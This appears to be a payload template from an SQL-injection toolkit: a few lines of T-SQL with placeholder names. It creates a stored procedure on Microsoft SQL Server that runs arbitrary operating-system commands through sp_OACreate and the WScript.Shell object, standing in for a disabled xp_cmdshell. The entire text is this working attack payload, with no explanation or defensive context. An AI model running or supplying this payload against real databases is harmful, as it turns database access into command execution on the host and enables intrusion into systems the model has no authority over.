DECLARE @%RANDSTR% nvarchar(999);
set @%RANDSTR%='CREATE PROCEDURE %XP_CMDSHELL_NEW%(@cmd varchar(255)) AS DECLARE @ID int EXEC sp_OACreate ''WScript.Shell'',@ID OUT EXEC sp_OAMethod @ID,''Run'',Null,@cmd,0,1 EXEC sp_OADestroy @ID';
EXEC master..sp_executesql @%RANDSTR%
